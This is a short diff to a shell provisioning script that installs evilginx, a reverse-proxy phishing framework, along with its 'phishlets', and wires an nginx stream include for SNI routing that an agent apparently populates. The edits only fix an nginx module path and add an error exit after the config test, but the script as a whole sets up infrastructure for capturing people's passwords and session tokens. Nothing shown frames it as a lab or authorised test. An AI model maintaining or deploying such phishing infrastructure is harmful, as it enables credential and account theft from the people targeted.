@@ -63,7 +63,7 @@ rm -f /etc/nginx/modules-enabled/50-mod-stream.conf
 sed -i '/load_module.*ngx_stream_module/d' /etc/nginx/nginx.conf
 # Add load_module once at top (needed for dynamic module)
 if [[ -f /usr/lib/nginx/modules/ngx_stream_module.so ]]; then
-    sed -i '1i load_module modules/ngx_stream_module.so;' /etc/nginx/nginx.conf
+    sed -i '1i load_module /usr/lib/nginx/modules/ngx_stream_module.so;' /etc/nginx/nginx.conf
 fi
 
 echo "==> Step 2/6  evilginx binary + phishlets"
@@ -114,7 +114,7 @@ echo "==> Step 4/6  nginx: top-level stream include (agent writes SNI map here)"
 if ! grep -q "include $NGINX_STREAM_DIR/\*.conf;" /etc/nginx/nginx.conf; then
     sed -i "s#^}\$#}\n\nstream {\n    include $NGINX_STREAM_DIR/*.conf;\n}#" /etc/nginx/nginx.conf
 fi
-nginx -t
+nginx -t || { echo "ERROR: nginx config test failed" >&2; exit 1; }
 systemctl enable --now nginx
 
 echo "==> Step 5/6  systemd unit + env"
